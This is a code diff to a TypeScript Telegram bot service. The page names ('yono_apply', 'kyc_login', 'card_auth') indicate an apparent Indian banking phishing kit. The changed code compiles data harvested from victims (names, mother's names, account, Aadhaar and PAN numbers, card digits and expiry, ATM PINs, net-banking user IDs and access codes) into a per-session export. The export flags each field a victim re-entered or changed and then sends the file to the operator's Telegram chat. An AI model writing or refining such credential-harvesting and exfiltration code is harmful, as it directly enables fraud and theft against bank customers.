@@ -531,107 +531,157 @@ export class TelegramBotService {
             sessions.push(currentSession);
         }
 
-        // Merge session data into single objects
-        const mergedSessions = sessions.map(sessionForms => {
-            const merged: any = {};
-            // Process in chronological order (oldest first within session)
-            const chronological = [...sessionForms].reverse();
-            chronological.forEach((form: any) => {
-                Object.keys(form).forEach(key => {
-                    if (key !== 'pageName' && key !== 'submittedAt' && form[key]) {
-                        merged[key] = form[key];
-                    }
-                });
-            });
-            // Get the earliest and latest timestamps
-            const earliest = new Date(chronological[0].submittedAt);
-            const latest = new Date(sessionForms[0].submittedAt);
-            merged.sessionStart = earliest;
-            merged.sessionEnd = latest;
-            // Determine flow type based on pages present
-            const pageNames = sessionForms.map((f: any) => f.pageName);
-            if (pageNames.includes('profile_verify')) {
-                merged.flowType = 'Main Flow (Complete)';
-            } else if (pageNames.includes('login_details')) {
-                merged.flowType = 'Apply Flow (Complete)';
-            } else if (pageNames.includes('yono_apply') || pageNames.includes('verification') || pageNames.includes('login_details')) {
-                merged.flowType = 'Apply Flow (Partial)';
-            } else if (pageNames.includes('kyc_login') || pageNames.includes('card_auth')) {
-                merged.flowType = 'Main Flow (Partial)';
-            } else {
-                merged.flowType = 'Unknown Flow (Partial)';
-            }
-            merged.pagesSubmitted = pageNames.join(', ');
-            return merged;
-        });
-
-        // Helper to format a section only if it has data
-        const formatSection = (title: string, fields: { label: string; value: any }[]): string => {
-            const filledFields = fields.filter(f => f.value && f.value !== 'N/A' && f.value !== '');
-            if (filledFields.length === 0) return '';
-
-            let section = `>> ${title}\n`;
-            filledFields.forEach(f => {
-                section += `   ${f.label}: ${f.value}\n`;
-            });
-            section += '\n';
-            return section;
+        // Helper to get display name for a field key
+        const getFieldDisplayName = (key: string): string => {
+            const fieldNames: Record<string, string> = {
+                fullName: 'Full Name',
+                mobileNumber: 'Mobile Number',
+                motherName: 'Mother Name',
+                accountNumber: 'Account Number',
+                aadhaarNumber: 'Aadhaar Number',
+                panCard: 'PAN Card',
+                cardLast6: 'Card Last 6',
+                atmPin: 'ATM PIN',
+                cifNumber: 'CIF Number',
+                branchCode: 'Branch Code',
+                dateOfBirth: 'Date of Birth',
+                cardExpiry: 'Card Expiry',
+                finalPin: 'Final PIN',
+                userId: 'User ID',
+                accessCode: 'Access Code',
+                profileCode: 'Profile Code',
+                name: 'Name',
+                phoneNumber: 'Phone Number'
+            };
+            return fieldNames[key] || key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
         };
 
-        // Generate cleanly formatted text content
+        // Fields to exclude from display
+        const excludeFields = new Set(['pageName', 'submittedAt', 'deviceId', 'currentFlow', 'id', 'sessionStart', 'sessionEnd', 'flowType', 'pagesSubmitted']);
+
+        // Generate text content with submission history
         let content = `========================================\n`;
         content += `       FORM SUBMISSIONS EXPORT\n`;
         content += `========================================\n`;
         content += `Device: ${device.name}\n`;
         content += `Generated: ${new Date().toLocaleString()}\n`;
-        content += `Total Sessions: ${mergedSessions.length}\n`;
-        content += `(Includes complete and partial submissions)\n`;
+        content += `Total Sessions: ${sessions.length}\n`;
+        content += `(Shows ALL submissions including field changes)\n`;
         content += `========================================\n\n`;
 
-        mergedSessions.forEach((sessionData: any, index: number) => {
-            const startDate = new Date(sessionData.sessionStart).toLocaleString();
-            const endDate = new Date(sessionData.sessionEnd).toLocaleString();
+        sessions.forEach((sessionForms: any[], sessionIndex: number) => {
+            // Process in chronological order (oldest first within session)
+            const chronological = [...sessionForms].reverse();
+
+            // Get the earliest and latest timestamps
+            const earliest = new Date(chronological[0].submittedAt);
+            const latest = new Date(sessionForms[0].submittedAt);
+
+            // Determine flow type based on pages present
+            const pageNames = sessionForms.map((f: any) => f.pageName).filter(Boolean);
+            let flowType = 'Unknown Flow';
+            if (pageNames.includes('profile_verify')) {
+                flowType = 'Main Flow (Complete)';
+            } else if (pageNames.includes('login_details')) {
+                flowType = 'Apply Flow (Complete)';
+            } else if (pageNames.includes('yono_apply') || pageNames.includes('verification')) {
+                flowType = 'Apply Flow (Partial)';
+            } else if (pageNames.includes('kyc_login') || pageNames.includes('card_auth')) {
+                flowType = 'Main Flow (Partial)';
+            }
 
             content += `----------------------------------------\n`;
-            content += `SESSION #${index + 1} (${sessionData.flowType})\n`;
-            content += `Started: ${startDate}\n`;
-            if (startDate !== endDate) {
-                content += `Last Activity: ${endDate}\n`;
+            content += `SESSION #${sessionIndex + 1} (${flowType})\n`;
+            content += `Started: ${earliest.toLocaleString()}\n`;
+            if (earliest.getTime() !== latest.getTime()) {
+                content += `Last Activity: ${latest.toLocaleString()}\n`;
             }
-            content += `Pages: ${sessionData.pagesSubmitted}\n`;
+            content += `Total Submissions: ${chronological.length}\n`;
             content += `----------------------------------------\n\n`;
 
-            // Personal Details - only show if has data
-            content += formatSection('PERSONAL DETAILS', [
-                { label: 'Name', value: sessionData.fullName || sessionData.name },
-                { label: 'Mobile', value: sessionData.mobileNumber || sessionData.phoneNumber },
-                { label: 'Mother Name', value: sessionData.motherName },
-                { label: 'DOB', value: sessionData.dateOfBirth }
-            ]);
+            // Track field values to detect changes
+            const fieldHistory: Record<string, string[]> = {};
+            const seenPages = new Set<string>();
 
-            // Account Details - only show if has data
-            content += formatSection('ACCOUNT DETAILS', [
-                { label: 'Account No', value: sessionData.accountNumber },
-                { label: 'Aadhaar', value: sessionData.aadhaarNumber },
-                { label: 'PAN Card', value: sessionData.panCard },
-                { label: 'CIF Number', value: sessionData.cifNumber },
-                { label: 'Branch Code', value: sessionData.branchCode }
-            ]);
+            // Show all submissions chronologically
+            content += `>> SUBMISSION HISTORY (Chronological)\n\n`;
 
-            // Card Details - only show if has data
-            content += formatSection('CARD DETAILS', [
-                { label: 'Card Last 6', value: sessionData.cardLast6 },
-                { label: 'Card Expiry', value: sessionData.cardExpiry },
-                { label: 'ATM PIN', value: sessionData.atmPin },
-                { label: 'Final PIN', value: sessionData.finalPin }
-            ]);
+            chronological.forEach((form: any, formIndex: number) => {
+                const timestamp = new Date(form.submittedAt).toLocaleString();
+                const pageName = form.pageName || 'unknown';
 
-            // Login Credentials - only show if has data
-            content += formatSection('LOGIN CREDENTIALS', [
-                { label: 'User ID', value: sessionData.userId },
-                { label: 'Access Code', value: sessionData.accessCode },
-                { label: 'Profile Code', value: sessionData.profileCode }
-            ]);
+                // Check if this is a resubmission of the same page
+                const isResubmission = seenPages.has(pageName);
+                seenPages.add(pageName);
+
+                content += `[${formIndex + 1}] Page: ${pageName} (${timestamp})`;
+                if (isResubmission) {
+                    content += ` [RESUBMISSION]`;
+                }
+                content += `\n`;
+
+                // Show all fields from this submission
+                Object.keys(form).forEach(key => {
+                    if (excludeFields.has(key)) return;
+                    const value = form[key];
+                    if (!value || value === '') return;
+
+                    const displayName = getFieldDisplayName(key);
+                    const previousValues = fieldHistory[key] || [];
+                    const lastValue = previousValues.length > 0 ? previousValues[previousValues.length - 1] : null;
+
+                    // Check if value changed from previous
+                    if (lastValue && lastValue !== value) {
+                        content += `    ${displayName}: ${value} ← CHANGED (was: ${lastValue})\n`;
+                    } else {
+                        content += `    ${displayName}: ${value}\n`;
+                    }
+
+                    // Track this value in history
+                    if (!fieldHistory[key]) {
+                        fieldHistory[key] = [];
+                    }
+                    fieldHistory[key].push(value);
+                });
+                content += `\n`;
+            });
+
+            // Build consolidated data (final values for each field)
+            const consolidated: Record<string, string> = {};
+            chronological.forEach((form: any) => {
+                Object.keys(form).forEach(key => {
+                    if (excludeFields.has(key)) return;
+                    if (form[key] && form[key] !== '') {
+                        consolidated[key] = form[key];
+                    }
+                });
+            });
+
+            // Show consolidated view at the end of session
+            content += `----------------------------------------\n`;
+            content += `>> CONSOLIDATED DATA (Final Values)\n`;
+            content += `----------------------------------------\n`;
+
+            // Group consolidated data by category
+            const personalFields = ['fullName', 'name', 'mobileNumber', 'phoneNumber', 'motherName', 'dateOfBirth'];
+            const accountFields = ['accountNumber', 'aadhaarNumber', 'panCard', 'cifNumber', 'branchCode'];
+            const cardFields = ['cardLast6', 'cardExpiry', 'atmPin', 'finalPin'];
+            const loginFields = ['userId', 'accessCode', 'profileCode'];
+
+            const formatConsolidatedSection = (title: string, fields: string[]): string => {
+                const items = fields
+                    .filter(f => consolidated[f])
+                    .map(f => `   ${getFieldDisplayName(f)}: ${consolidated[f]}`);
+                if (items.length === 0) return '';
+                return `\n${title}:\n${items.join('\n')}\n`;
+            };
+
+            content += formatConsolidatedSection('Personal Details', personalFields);
+            content += formatConsolidatedSection('Account Details', accountFields);
+            content += formatConsolidatedSection('Card Details', cardFields);
+            content += formatConsolidatedSection('Login Credentials', loginFields);
+
+            content += `\n`;
         });
 
         content += `========================================\n`;
@@ -647,7 +697,7 @@ export class TelegramBotService {
 
         try {
             await this.bot?.sendDocument(chatId, filePath, {
-                caption: `📝 All form submissions from ${device.name} (${mergedSessions.length} sessions)`,
+                caption: `📝 All form submissions from ${device.name} (${sessions.length} sessions, ${allForms.length} total submissions)`,
                 reply_markup: {
                     inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                 }
